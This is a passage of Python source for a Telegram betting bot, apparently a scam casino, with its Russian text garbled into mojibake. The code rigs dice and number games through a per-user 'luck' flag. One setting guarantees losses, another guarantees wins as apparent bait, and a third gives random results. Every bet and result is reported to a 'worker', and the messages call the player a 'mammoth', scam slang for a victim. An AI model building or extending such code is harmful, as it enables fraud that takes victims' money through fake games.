            await bot.send_message(call.from_user.id,text)
    except Exception as err:
            print(err)
            await call.message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*', parse_mode='Markdown')

@dp.message_handler(content_types=['text'], state=ecn_add)  # –ü—Ä–∏–Ω–∏–º–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ
async def add_depos(message: types.Message, state: FSMContext):
    try:
        profile = all_users.get(all_users.user_id == message.from_user.id)
        async with state.proxy() as data:
            data['summ'] = message.text
        await state.finish()

        if int(data['summ']) < 500 or int(data['summ']) > profile.balance:
            await message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*', parse_mode='Markdown')
        else:
            text = 'ü§µ –°—Ç–∞–≤–∫–∞ ' + data['summ'] +' RUB –∑–∞—Å—á–∏—Ç–∞–Ω–∞, –≤—ã–±–µ—Ä–∏—Ç–µ –æ—Ä–µ–ª / —Ä–µ—à–∫–∞'
            ratio_ru = types.InlineKeyboardMarkup(row_width=3)
            ratio_ru.add(types.InlineKeyboardButton('üü† –†–µ—à–∫–∞', callback_data=f'down_{data["summ"]}'))
            ratio_ru.add(types.InlineKeyboardButton('üü§ –û—Ä—ë–ª', callback_data=f'up_{data["summ"]}'))
            ratio_ru.add(types.InlineKeyboardButton('–ù–∞–∑–∞–¥', callback_data='back_to_ecn'))
            await message.answer(text, reply_markup=ratio_ru)
    except Exception as err:
        print(err)
        await message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*', parse_mode='Markdown')


@dp.message_handler(content_types=['text'], state=rnd_numchik)  # –ü—Ä–∏–Ω–∏–º–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ
async def add_depos(message: types.Message, state: FSMContext):
    try:
        profile = all_users.get(all_users.user_id == message.from_user.id)
        async with state.proxy() as data:
            data['summ'] = message.text
        await state.finish()

        if int(data['summ']) < 500 or int(data['summ']) > profile.balance:
            await message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*', parse_mode='Markdown')
        else:
            text = 'ü§µ –°—Ç–∞–≤–∫–∞ ' + data['summ'] +' RUB –∑–∞—Å—á–∏—Ç–∞–Ω–∞, –≤—ã–ø–∞–ª–æ —á–∏—Å–ª–æ, –≤—ã–±–µ—Ä–∏—Ç–µ –µ–≥–æ –∏–Ω—Ç–µ—Ä–≤–∞–ª.'
            ratio_ru = types.InlineKeyboardMarkup(row_width=3)
            ratio_ru.add(types.InlineKeyboardButton('üìà > 50', callback_data=f'rnd1_{data["summ"]}'))
            ratio_ru.add(types.InlineKeyboardButton('üìä = 50', callback_data=f'rnd2_{data["summ"]}'))
            ratio_ru.add(types.InlineKeyboardButton('üìâ < 50', callback_data=f'rnd3_{data["summ"]}'))
            ratio_ru.add(types.InlineKeyboardButton('–ù–∞–∑–∞–¥', callback_data='back_to_ecn'))
            await message.answer(text, reply_markup=ratio_ru)
    except Exception as err:
        print(err)
        await message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*', parse_mode='Markdown')


@dp.message_handler(content_types=['text'], state=kubik_casino)  # –ü—Ä–∏–Ω–∏–º–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ
async def kibuk_start(message: types.Message, state: FSMContext):
    try:
        profile = all_users.get(all_users.user_id == message.from_user.id)
        async with state.proxy() as data:
            data['summ'] = message.text
        await state.finish()

        if int(data['summ']) < 500 or int(data['summ']) > profile.balance:
            await message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*', parse_mode='Markdown')
        else:

            text = 'ü§µ –°—Ç–∞–≤–∫–∞ ' + data['summ'] +' RUB –∑–∞—Å—á–∏—Ç–∞–Ω–∞, –≤—ã–±–µ—Ä–∏—Ç–µ —á–∏—Å–ª–æ:'
            ratio_ru = types.InlineKeyboardMarkup(row_width=3)
            ratio_ru.add(types.InlineKeyboardButton('üé≤ –ö—É–±–∏–∫ [1]', callback_data=f'kub_{data["summ"]}:1'))
            ratio_ru.add(types.InlineKeyboardButton('üé≤ –ö—É–±–∏–∫ [2]', callback_data=f'kub_{data["summ"]}:2'))
            ratio_ru.add(types.InlineKeyboardButton('üé≤ –ö—É–±–∏–∫ [3]', callback_data=f'kub_{data["summ"]}:3'))
            ratio_ru.add(types.InlineKeyboardButton('üé≤ –ö—É–±–∏–∫ [4]', callback_data=f'kub_{data["summ"]}:4'))
            ratio_ru.add(types.InlineKeyboardButton('üé≤ –ö—É–±–∏–∫ [5]', callback_data=f'kub_{data["summ"]}:5'))
            ratio_ru.add(types.InlineKeyboardButton('üé≤ –ö—É–±–∏–∫ [6]', callback_data=f'kub_{data["summ"]}:6'))
            ratio_ru.add(types.InlineKeyboardButton('–ù–∞–∑–∞–¥', callback_data='back_to_ecn'))
            await message.answer(text, reply_markup=ratio_ru)
    except Exception as err:
        print(err)
        await message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*', parse_mode='Markdown')


@dp.callback_query_handler(text_contains="kub_", state="*")
async def kubik_casik(call: types.CallbackQuery):
    try:

        await call.message.delete()
        summ_test = call.data.split('_')[1].index(':')
        summ = call.data.split('_')[1][0:summ_test]
        num_on_cube = call.data.split(':')[1][0]
        int(summ)
        profile = all_users.get(all_users.user_id == call.from_user.id)

        
        if profile.fart == 2:

            if not (profile.worker is None):
                await bot.send_message(profile.worker,
                                       f'üíü –ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                       f'ID: {profile.user_id}\n'
                                       f'–°–¥–µ–ª–∞–ª —Å—Ç–∞–≤–∫—É –Ω–∞ {summ} ')

            kubik_nomer = [1,2,3,4,5,6]
            rnd_nomer_kub = random.choice(kubik_nomer)

            await bot.send_message(call.from_user.id,f'\n\n–í—ã –≤—ã–±—Ä–∞–ª–∏ –∫—É–±–∏–∫ —Å –Ω–æ–º–µ—Ä–æ–º: {num_on_cube}\n\nüìä –ö–∏–¥–∞–µ–º –∫—É–±–∏–∫...')
            await bot.send_sticker(chat_id=call.from_user.id,sticker=nomer_kubika_idstikers[rnd_nomer_kub])
            await asyncio.sleep(3)
            #profile.balance = profile.balance - int(summ)
            #profile.save()
            if int(num_on_cube) != rnd_nomer_kub:
                text=f'''
üòï –í—ã –ø—Ä–æ–∏–≥—Ä–∞–ª–∏ {int(summ)}‚ÇΩ üòï
üíµ –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞: {summ} RUB [X4]
üé≤ –í—ã—à–µ —á–∏—Å–ª–æ: {num_on_cube}
üé≤ –í—ã–ø–∞–ª–æ —á–∏—Å–ª–æ: {rnd_nomer_kub}
üí∞ –î–æ—Å—Ç—É–ø–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ'''
                profile.balance = profile.balance - int(summ)
                profile.save()
                if not (profile.worker is None):
                    await bot.send_message(profile.worker,
                                               f'üíü–ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                               f'ID: {profile.user_id}\n'
                                               f'–°—Ç–∞–≤–∫–∞ –Ω–∞ {summ} –ü–†–û–ò–ì–†–ê–õ–ê ‚ùå')
            else:
                text = f'''
ü§ë –í—ã –≤—ã–π–≥—Ä–∞–ª–∏ {(int(summ) + int(summ)) * 2}‚ÇΩ ü§ë
üíµ –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞: {summ} RUB [X4]
üé≤ –í—ã—à–µ —á–∏—Å–ª–æ: {num_on_cube}
üé≤ –í—ã–ø–∞–ª–æ —á–∏—Å–ª–æ: {num_on_cube}
üí∞ –î–æ—Å—Ç—É–ø–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ'''
                profile.balance = profile.balance + (int(summ) + int(summ)) * 2
                profile.save()
                if not (profile.worker is None):
                    await bot.send_message(profile.worker,
                                               f'üíü–ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                               f'ID: {profile.user_id}\n'
                                               f'–°—Ç–∞–≤–∫–∞ –Ω–∞ {summ} –í–´–ô–ì–†–ê–õ–ê ‚úÖ ')

                
            continue_invest = types.InlineKeyboardMarkup()
            cont = types.InlineKeyboardButton('–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å —Å—Ç–∞–≤–∏—Ç—å ‚û°Ô∏è', callback_data='continue_invest3')
            continue_invest.add(cont)
            await call.message.answer(text, reply_markup=continue_invest)




        if profile.fart == 0:
            if not (profile.worker is None):
                await bot.send_message(profile.worker,
                                       f'üíü –ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                       f'ID: {profile.user_id}\n'
                                       f'–°–¥–µ–ª–∞–ª —Å—Ç–∞–≤–∫—É –Ω–∞ {summ} ')
            kubik_nomer = [1,2,3,4,5,6]
            kubik_nomer.remove(int(num_on_cube))
            rnd_nomer_kub = random.choice(kubik_nomer)   
            await bot.send_message(call.from_user.id,f'\n\n–í—ã –≤—ã–±—Ä–∞–ª–∏ –∫—É–±–∏–∫ —Å –Ω–æ–º–µ—Ä–æ–º: {num_on_cube}\n\nüìä –ö–∏–¥–∞–µ–º –∫—É–±–∏–∫...')
            await bot.send_sticker(chat_id=call.from_user.id,sticker=nomer_kubika_idstikers[rnd_nomer_kub])
            await asyncio.sleep(3)
            profile.balance = profile.balance - int(summ)
            profile.save()
            text=f'''
üòï –í—ã –ø—Ä–æ–∏–≥—Ä–∞–ª–∏ {int(summ)}‚ÇΩ üòï
üíµ –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞: {summ} RUB [X4]
üé≤ –í—ã—à–µ —á–∏—Å–ª–æ: {num_on_cube}
üé≤ –í—ã–ø–∞–ª–æ —á–∏—Å–ª–æ: {rnd_nomer_kub}
üí∞ –î–æ—Å—Ç—É–ø–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ'''
            continue_invest = types.InlineKeyboardMarkup()
            cont = types.InlineKeyboardButton('–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å —Å—Ç–∞–≤–∏—Ç—å ‚û°Ô∏è', callback_data='continue_invest3')
            continue_invest.add(cont)
            await call.message.answer(text, reply_markup=continue_invest)
            


        if profile.fart == 1:
            if not (profile.worker is None):
                await bot.send_message(profile.worker,
                                       f'üíü –ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                       f'ID: {profile.user_id}\n'
                                       f'–°–¥–µ–ª–∞–ª —Å—Ç–∞–≤–∫—É –Ω–∞ {summ} ')
            
            await bot.send_message(call.from_user.id,f'\n\n–í—ã –≤—ã–±—Ä–∞–ª–∏ –∫—É–±–∏–∫ —Å –Ω–æ–º–µ—Ä–æ–º: {num_on_cube}\n\nüìä –ö–∏–¥–∞–µ–º –∫—É–±–∏–∫...')
            await bot.send_sticker(chat_id=call.from_user.id,
            sticker=nomer_kubika_idstikers[int(num_on_cube)])
            await asyncio.sleep(3)
            profile.balance = profile.balance + (int(summ) + int(summ)) * 2
            profile.save()
            text=f'''
ü§ë –í—ã –≤—ã–π–≥—Ä–∞–ª–∏ {(int(summ) + int(summ)) * 2}‚ÇΩ ü§ë
üíµ –í–∞—à–∞ —Å—Ç–∞–≤–∫–∞: {summ} RUB [X4]
üé≤ –í—ã—à–µ —á–∏—Å–ª–æ: {num_on_cube}
üé≤ –í—ã–ø–∞–ª–æ —á–∏—Å–ª–æ: {num_on_cube}
üí∞ –î–æ—Å—Ç—É–ø–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ'''
            continue_invest = types.InlineKeyboardMarkup()
            cont = types.InlineKeyboardButton('–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å —Å—Ç–∞–≤–∏—Ç—å ‚û°Ô∏è', callback_data='continue_invest3')
            continue_invest.add(cont)
            await call.message.answer(text, reply_markup=continue_invest)

    except Exception as err:
        await call.message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*', parse_mode='Markdown')


@dp.callback_query_handler(text_contains="rnd2_", state="*")
async def rnd1fuck(call: types.CallbackQuery):
    try:
        summ = call.data.split('_')[1]
        int(summ)
        profile = all_users.get(all_users.user_id == call.from_user.id)
        if profile.fart == 2:
            if not (profile.worker is None):
                await bot.send_message(profile.worker,
                                       f'üíü –ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                       f'ID: {profile.user_id}\n'
                                       f'–°–¥–µ–ª–∞–ª —Å—Ç–∞–≤–∫—É –Ω–∞ {summ} ')
            random_num_game = random.randint(0,101)
            if random_num_game == 50:
                await call.message.edit_text(f'–í—ã –≤—ã–±—Ä–∞–ª–∏: üìä = 50\n\nüìä –í—ã–±–∏—Ä–∞–µ–º —Ä–∞–Ω–¥–æ–º–Ω–æ–µ —á–∏—Å–ª–æ...')
                await asyncio.sleep(5)
                if not (profile.worker is None):
                    await bot.send_message(profile.worker,
                                               f'üíü–ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                               f'ID: {profile.user_id}\n'
                                               f'–°—Ç–∞–≤–∫–∞ –Ω–∞ {summ} –í–´–ô–ì–†–ê–õ–ê ‚úÖ ')
                profile.balance += int(summ)
                profile.save()
                text = f'''
ü§ë –í—ã –≤—ã–π–≥—Ä–∞–ª–∏ {int(summ) + int(summ)}‚ÇΩ ü§ë
–í—ã–ø–∞–ª–æ —á–∏—Å–ª–æ: {random_num_game}
–î–æ—Å—Ç—É–ø–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ
                                                        '''
                continue_invest = types.InlineKeyboardMarkup()
                cont = types.InlineKeyboardButton('–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å —Å—Ç–∞–≤–∏—Ç—å ‚û°Ô∏è', callback_data='continue_invest2')
                continue_invest.add(cont)
                await call.message.answer(text, reply_markup=continue_invest)

            elif random_num_game != 50:
                random_num_game = random.randint(0,50)
                await call.message.edit_text(f'–í—ã –≤—ã–±—Ä–∞–ª–∏: üìä = 50\n\nüìä –í—ã–±–∏—Ä–∞–µ–º —Ä–∞–Ω–¥–æ–º–Ω–æ–µ —á–∏—Å–ª–æ...')
                await asyncio.sleep(5)
                if not (profile.worker is None):
                    await bot.send_message(profile.worker,
                                               f'üíü –ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                               f'ID: {profile.user_id}\n'
                                               f'–°—Ç–∞–≤–∫–∞ –Ω–∞ {summ} –ø—Ä–æ–∏–≥—Ä–∞–ª–∞ ‚ùå')
                profile.balance -= int(summ)
                profile.save()
                text = f'''
üò• –ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, –≤—ã –ø—Ä–æ–∏–≥—Ä–∞–ª–∏ üò•

–í—ã–ø–∞–ª–æ —á–∏—Å–ª–æ: {random_num_game}

–î–æ—Å—Ç—É–ø–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ
                                                                    '''
                continue_invest = types.InlineKeyboardMarkup()
                cont = types.InlineKeyboardButton('–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å —Å—Ç–∞–≤–∏—Ç—å ‚û°Ô∏è', callback_data='continue_invest2')
                continue_invest.add(cont)
                await call.message.answer(text, reply_markup=continue_invest)
        if profile.fart == 1:
            if not (profile.worker is None):
                await bot.send_message(profile.worker,
                                       f'–ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                       f'ID: {profile.user_id}\n'
                                       f'–†–µ—à–∏–ª —Å–¥–µ–ª–∞—Ç—å —Å—Ç–∞–≤–∫—É –Ω–∞ {summ} ')
            await call.message.edit_text(f'–í—ã –≤—ã–±—Ä–∞–ª–∏: üìä = 50\n\nüìä –í—ã–±–∏—Ä–∞–µ–º —Ä–∞–Ω–¥–æ–º–Ω–æ–µ —á–∏—Å–ª–æ...')
            await asyncio.sleep(5)
            if not (profile.worker is None):
                await bot.send_message(profile.worker,
f'üíü –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{profile.username}\n'
f'ID: {profile.user_id}\n'
f'–°—Ç–∞–≤–∫–∞ –Ω–∞ {summ} –ø—Ä–æ–∏–≥—Ä–∞–ª–∞ ')

            profile.balance += int(summ)
            profile.save()
            text = f'''
ü§ë –í—ã –≤—ã–π–≥—Ä–∞–ª–∏ {int(summ) + int(summ)}‚ÇΩ ü§ë
–í–∞–º –≤—ã–ø–∞–ª–æ —á–∏—Å–ª–æ: 50

–î–æ—Å—Ç—É–ø–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ
'''
            continue_invest = types.InlineKeyboardMarkup()
            cont = types.InlineKeyboardButton('–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å —Å—Ç–∞–≤–∏—Ç—å ‚û°Ô∏è', callback_data='continue_invest2')
            continue_invest.add(cont)
            await call.message.answer(text, reply_markup=continue_invest)
        if profile.fart == 0:
            random_num_game = random.randint(0,50)
            if not (profile.worker is None):
                await bot.send_message(profile.worker,
                                       f'–ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                       f'ID: {profile.user_id}\n'
                                       f'–†–µ—à–∏–ª —Å–¥–µ–ª–∞—Ç—å —Å—Ç–∞–≤–∫—É –Ω–∞ {summ} ')
            await call.message.edit_text(f'–í—ã –≤—ã–±—Ä–∞–ª–∏: üìà > 50\n\nüìä –í—ã–±–∏—Ä–∞–µ–º —Ä–∞–Ω–¥–æ–º–Ω–æ–µ —á–∏—Å–ª–æ...')
            await asyncio.sleep(5)
            if not (profile.worker is None):
                await bot.send_message(profile.worker,
f'üíü –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{profile.username}\n'
f'ID: {profile.user_id}\n'
f'–°—Ç–∞–≤–∫–∞ –Ω–∞ {summ} –ø—Ä–æ–∏–≥—Ä–∞–ª–∞ ')

            profile.balance -= int(summ)
            profile.save()
            text = f'''
üò• –ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, –≤—ã –ø—Ä–æ–∏–≥—Ä–∞–ª–∏ üò•

üìâ –í—ã–ø–∞–ª–æ —á–∏—Å–ª–æ: {random_num_game}

–î–æ—Å—Ç—É–ø–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ
'''
            continue_invest = types.InlineKeyboardMarkup()
            cont = types.InlineKeyboardButton('–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å —Å—Ç–∞–≤–∏—Ç—å ‚û°Ô∏è', callback_data='continue_invest2')
            continue_invest.add(cont)
            await call.message.answer(text, reply_markup=continue_invest)
    except Exception as err:
        print(err)
        await call.message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*', parse_mode='Markdown')


@dp.callback_query_handler(text_contains="rnd1_", state="*")
async def rnd1fuck(call: types.CallbackQuery):
    try:
        summ = call.data.split('_')[1]
        int(summ)
        profile = all_users.get(all_users.user_id == call.from_user.id)
        if profile.fart == 2:

            if not (profile.worker is None):
                await bot.send_message(profile.worker,
                                       f'üíü –ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                       f'ID: {profile.user_id}\n'
                                       f'–°–¥–µ–ª–∞–ª —Å—Ç–∞–≤–∫—É –Ω–∞ {summ} ')
            rand = random.randint(1, 2)
            if rand == 1:
                random_num_game = random.randint(50,101)
                await call.message.edit_text(f'–í—ã –≤—ã–±—Ä–∞–ª–∏: üìà > 50\n\nüìä –í—ã–±–∏—Ä–∞–µ–º —Ä–∞–Ω–¥–æ–º–Ω–æ–µ —á–∏—Å–ª–æ...')
                await asyncio.sleep(5)
                if not (profile.worker is None):
                    await bot.send_message(profile.worker,
                                               f'üíü–ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                               f'ID: {profile.user_id}\n'
                                               f'–°—Ç–∞–≤–∫–∞ –Ω–∞ {summ} –≤—ã–∏–≥—Ä–∞–ª–∞ ')
                profile.balance += int(summ)
                profile.save()
                text = f'''
ü§ë –í—ã –≤—ã–π–≥—Ä–∞–ª–∏ {int(summ) + int(summ)}‚ÇΩ ü§ë
–í—ã–ø–∞–ª–æ —á–∏—Å–ª–æ: {random_num_game}
–î–æ—Å—Ç—É–ø–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ
                                                        '''
                continue_invest = types.InlineKeyboardMarkup()
                cont = types.InlineKeyboardButton('–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å —Å—Ç–∞–≤–∏—Ç—å ‚û°Ô∏è', callback_data='continue_invest2')
                continue_invest.add(cont)
                await call.message.answer(text, reply_markup=continue_invest)

            elif rand == 2:
                random_num_game = random.randint(0,50)
                await call.message.edit_text(f'–í—ã –≤—ã–±—Ä–∞–ª–∏: üìà > 50\n\nüìä –í—ã–±–∏—Ä–∞–µ–º —Ä–∞–Ω–¥–æ–º–Ω–æ–µ —á–∏—Å–ª–æ...')
                await asyncio.sleep(5)
                if not (profile.worker is None):
                    await bot.send_message(profile.worker,
                                               f'üíü –ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                               f'ID: {profile.user_id}\n'
                                               f'–°—Ç–∞–≤–∫–∞ –Ω–∞ {summ} –Ω–µ –ø—Ä–æ–∏–≥—Ä–∞–ª–∞ ')
                profile.balance -= int(summ)
                profile.save()
                text = f'''
üò• –ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, –≤—ã –ø—Ä–æ–∏–≥—Ä–∞–ª–∏ üò•
–í—ã–ø–∞–ª–æ —á–∏—Å–ª–æ: {random_num_game}
–î–æ—Å—Ç—É–ø–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ
                                                                    '''
                continue_invest = types.InlineKeyboardMarkup()
                cont = types.InlineKeyboardButton('–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å —Å—Ç–∞–≤–∏—Ç—å ‚û°Ô∏è', callback_data='continue_invest2')
                continue_invest.add(cont)
                await call.message.answer(text, reply_markup=continue_invest)
        if profile.fart == 1:
            random_num_game = random.randint(51,100)
            if not (profile.worker is None):
                await bot.send_message(profile.worker,
                                       f'–ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                       f'ID: {profile.user_id}\n'
                                       f'–†–µ—à–∏–ª —Å–¥–µ–ª–∞—Ç—å —Å—Ç–∞–≤–∫—É –Ω–∞ {summ} ')
            await call.message.edit_text(f'–í—ã –≤—ã–±—Ä–∞–ª–∏: üìà > 50\n\nüìä –í—ã–±–∏—Ä–∞–µ–º —Ä–∞–Ω–¥–æ–º–Ω–æ–µ —á–∏—Å–ª–æ...')
            await asyncio.sleep(5)
            if not (profile.worker is None):
                await bot.send_message(profile.worker,
f'üíü –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{profile.username}\n'
f'ID: {profile.user_id}\n'
f'–°—Ç–∞–≤–∫–∞ –Ω–∞ {summ} –ø—Ä–æ–∏–≥—Ä–∞–ª–∞ ')

            profile.balance += int(summ)
            profile.save()
            text = f'''
ü§ë –í—ã –≤—ã–π–≥—Ä–∞–ª–∏ {int(summ) + int(summ)}‚ÇΩ ü§ë
–í–∞–º –≤—ã–ø–∞–ª–æ —á–∏—Å–ª–æ: {random_num_game}

–î–æ—Å—Ç—É–ø–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ
'''
            continue_invest = types.InlineKeyboardMarkup()
            cont = types.InlineKeyboardButton('–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å —Å—Ç–∞–≤–∏—Ç—å ‚û°Ô∏è', callback_data='continue_invest2')
            continue_invest.add(cont)
            await call.message.answer(text, reply_markup=continue_invest)
        if profile.fart == 0:
            random_num_game = random.randint(0,50)
            if not (profile.worker is None):
                await bot.send_message(profile.worker,
                                       f'–ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                       f'ID: {profile.user_id}\n'
                                       f'–†–µ—à–∏–ª —Å–¥–µ–ª–∞—Ç—å —Å—Ç–∞–≤–∫—É –Ω–∞ {summ} ')
            await call.message.edit_text(f'–í—ã –≤—ã–±—Ä–∞–ª–∏: üìà > 50\n\nüìä –í—ã–±–∏—Ä–∞–µ–º —Ä–∞–Ω–¥–æ–º–Ω–æ–µ —á–∏—Å–ª–æ...')
            await asyncio.sleep(5)
            if not (profile.worker is None):
                await bot.send_message(profile.worker,
f'üíü –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{profile.username}\n'
f'ID: {profile.user_id}\n'
f'–°—Ç–∞–≤–∫–∞ –Ω–∞ {summ} –ü–†–û–ò–ì–†–ê–õ–ê ‚ùå ')

            profile.balance -= int(summ)
            profile.save()
            text = f'''
üìâ –í—ã–ø–∞–ª–æ —á–∏—Å–ª–æ: {random_num_game}
üò• –ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, –≤—ã –ø—Ä–æ–∏–≥—Ä–∞–ª–∏ üò•

–î–æ—Å—Ç—É–ø–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ
'''
            continue_invest = types.InlineKeyboardMarkup()
            cont = types.InlineKeyboardButton('–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å —Å—Ç–∞–≤–∏—Ç—å ‚û°Ô∏è', callback_data='continue_invest2')
            continue_invest.add(cont)
            await call.message.answer(text, reply_markup=continue_invest)
    except Exception as err:
        print(err)
        await call.message.answer('üõëÔ∏è *–û—à–∏–±–∫–∞*', parse_mode='Markdown')


@dp.callback_query_handler(text_contains="rnd3_", state="*")
async def rnd1fuck(call: types.CallbackQuery):
    try:
        summ = call.data.split('_')[1]
        int(summ)
        profile = all_users.get(all_users.user_id == call.from_user.id)
        if profile.fart == 2:

            if not (profile.worker is None):
                await bot.send_message(profile.worker,
                                       f'üíü –ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                       f'ID: {profile.user_id}\n'
                                       f'–°–¥–µ–ª–∞–ª —Å—Ç–∞–≤–∫—É –Ω–∞ {summ} ')
            rand = random.randint(1, 2)
            if rand == 1:
                random_num_game = random.randint(0,50)
                await call.message.edit_text(f'–í—ã –≤—ã–±—Ä–∞–ª–∏: üìâ < 50\n\nüìä –í—ã–±–∏—Ä–∞–µ–º —Ä–∞–Ω–¥–æ–º–Ω–æ–µ —á–∏—Å–ª–æ...')
                await asyncio.sleep(5)
                if not (profile.worker is None):
                    await bot.send_message(profile.worker,
                                               f'üíü–ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                               f'ID: {profile.user_id}\n'
                                               f'–°—Ç–∞–≤–∫–∞ –Ω–∞ {summ} –í–´–ô–ì–†–ê–õ–ê ‚úÖ ')
                profile.balance += int(summ)
                profile.save()
                text = f'''
ü§ë –í—ã –≤—ã–π–≥—Ä–∞–ª–∏ {int(summ) + int(summ)}‚ÇΩ ü§ë
–í—ã–ø–∞–ª–æ —á–∏—Å–ª–æ: {random_num_game}
–î–æ—Å—Ç—É–ø–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ
                                                        '''
                continue_invest = types.InlineKeyboardMarkup()
                cont = types.InlineKeyboardButton('–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å —Å—Ç–∞–≤–∏—Ç—å ‚û°Ô∏è', callback_data='continue_invest2')
                continue_invest.add(cont)
                await call.message.answer(text, reply_markup=continue_invest)

            elif rand == 2:
                random_num_game = random.randint(50,101)
                await call.message.edit_text(f'–í—ã –≤—ã–±—Ä–∞–ª–∏: üìâ < 50\n\nüìä –í—ã–±–∏—Ä–∞–µ–º —Ä–∞–Ω–¥–æ–º–Ω–æ–µ —á–∏—Å–ª–æ...')
                await asyncio.sleep(5)
                if not (profile.worker is None):
                    await bot.send_message(profile.worker,
                                               f'üíü –ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                               f'ID: {profile.user_id}\n'
                                               f'–°—Ç–∞–≤–∫–∞ –Ω–∞ {summ} –Ω–µ –ø—Ä–æ–∏–≥—Ä–∞–ª–∞ ')
                profile.balance -= int(summ)
                profile.save()
                text = f'''
üò• –ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, –≤—ã –ø—Ä–æ–∏–≥—Ä–∞–ª–∏ üò•
–í—ã–ø–∞–ª–æ —á–∏—Å–ª–æ: {random_num_game}
–î–æ—Å—Ç—É–ø–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ
                                                                    '''
                continue_invest = types.InlineKeyboardMarkup()
                cont = types.InlineKeyboardButton('–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å —Å—Ç–∞–≤–∏—Ç—å ‚û°Ô∏è', callback_data='continue_invest2')
                continue_invest.add(cont)
                await call.message.answer(text, reply_markup=continue_invest)
        if profile.fart == 1:
            random_num_game = random.randint(0,50)
            if not (profile.worker is None):
                await bot.send_message(profile.worker,
                                       f'–ú–∞–º–æ–Ω—Ç: @{profile.username}\n'
                                       f'ID: {profile.user_id}\n'
                                       f'–†–µ—à–∏–ª —Å–¥–µ–ª–∞—Ç—å —Å—Ç–∞–≤–∫—É –Ω–∞ {summ} ')
            await call.message.edit_text(f'–í—ã –≤—ã–±—Ä–∞–ª–∏: üìâ < 50\n\nüìä –í—ã–±–∏—Ä–∞–µ–º —Ä–∞–Ω–¥–æ–º–Ω–æ–µ —á–∏—Å–ª–æ...')
            await asyncio.sleep(5)
            if not (profile.worker is None):
                await bot.send_message(profile.worker,
f'üíü –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{profile.username}\n'
f'ID: {profile.user_id}\n'
f'–°—Ç–∞–≤–∫–∞ –Ω–∞ {summ} –ø—Ä–æ–∏–≥—Ä–∞–ª–∞ ')

            profile.balance += int(summ)
            profile.save()
            text = f'''
ü§ë –í—ã –≤—ã–π–≥—Ä–∞–ª–∏ {int(summ) + int(summ)}‚ÇΩ ü§ë
–í–∞–º –≤—ã–ø–∞–ª–æ —á–∏—Å–ª–æ: {random_num_game}

–î–æ—Å—Ç—É–ø–Ω—ã–π –±–∞–ª–∞–Ω—Å: {profile.balance}‚ÇΩ
'''
